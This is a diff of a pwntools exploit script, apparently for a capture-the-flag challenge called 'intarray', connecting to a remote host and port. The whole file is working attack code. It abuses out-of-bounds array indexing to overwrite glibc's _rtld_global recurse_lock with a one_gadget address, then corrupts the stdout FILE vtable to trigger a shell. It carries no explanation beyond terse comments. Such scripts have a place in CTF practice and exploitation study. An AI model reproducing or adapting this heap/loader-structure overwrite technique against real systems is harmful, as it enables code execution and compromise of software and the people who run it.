@@ -1,54 +1,62 @@
 from pwn import *
-import time
 
 #init
 
 e = ELF('./intarray')
-libc = ELF('./libc-2.33.so')
+libp = ELF('./libpthread-2.31.so')
+libc = ELF('./libcs-2.31.so')
+ld = ELF('./ld-2.31.so')
 
-p = process(e.path)
-#p = remote()
+#p = process(e.path)
+p = remote('159.89.254.233', 31784)
 
-def chg(x, y):
-    p.sendlineafter('?', 'y')
-    p.sendlineafter(':', str(x))
-    p.sendlineafter(':', str(y))
+#funcs
+
+def idx(x):
+    return x // 0x8
 
 #vars
 
-one_gadget = 0xcb5cd
-printf_argtab_off = 0x1d91f8
-printf_functab_off = 0x1d15c8
+libp_off = 0x4920
+mutexlock_off = libp.sym['pthread_mutex_lock']
 
-log.info('One gadget libc off: ' + hex(one_gadget))
-log.info('Printf argtab libc off: ' + hex(printf_argtab_off))
-log.info('Printf functab libc off: ' + hex(printf_functab_off))
+libc_off = 0x27920
+iostdout_off = libc.sym['_IO_2_1_stdout_']
+onegadget_off = 0xe6aee
+
+ld_off = 0x21b920
+rtld_off = ld.sym['_rtld_global']
+
+log.info('Libp stk off: ' + hex(libp_off))
+log.info('Mutexlock libp off: ' + hex(mutexlock_off))
+print("")
+log.info('Libc stk off: ' + hex(libc_off))
+log.info('iostdout libc off: ' + hex(iostdout_off))
+log.info('One gadget libc off: ' + hex(onegadget_off))
+print("")
+log.info('Ld stk off: ' + hex(ld_off))
+log.info('rtld ld off: ' + hex(rtld_off))
 
 #exploit
 
-#init fake printf table
+#send size so always pass check
 
-p.sendlineafter('?', str(0x80))
+p.sendlineafter('?', str(0xff))
 
-for i in range(0x80):
-    p.sendlineafter(':', '-')
+#edit _rtld_global->recurse_lock thing to point to one gadget
 
-#leak stk and libc since thread stk is constant offset to libc
+p.sendlineafter(':', str(idx(ld_off + rtld_off + 0xf08)))
+p.sendlineafter(':', str((onegadget_off + libc_off) - (mutexlock_off + libp_off)))
 
-p.sendlineafter('?', 'y')
-p.sendlineafter(':', str(71))
+#clear _rtld_global to fix one gadget call
 
-p.recvuntil('value ')
-stk = int(p.recvuntil('.', drop = True)) - 712
-libc_off = stk + 0x3a9c0#0x49c0
+p.sendlineafter('(y/N)', 'y')
+p.sendlineafter(':', str(idx(ld_off + rtld_off)))
 
-log.info('Stk adr: ' + hex(stk))
-log.info('Libc off adr: ' + hex(libc_off))
+#overwrite iostdout vtable to invalid so recurse_lock thing gets called
 
-#overwrite array pointer to printf_functab_off
-
-chg(((libc_off + printf_argtab_off) - stk) // 0x8, (libc_off + printf_functab_off) - ord('d') * 0x8)
-chg(((libc_off + printf_functab_off) - stk) // 0x8, libc_off + one_gadget)
+p.sendlineafter('(y/N)', 'y')
+p.sendlineafter(':', str(idx(libc_off + iostdout_off + 0x8 * 27)))
 
 #pray for flag
 
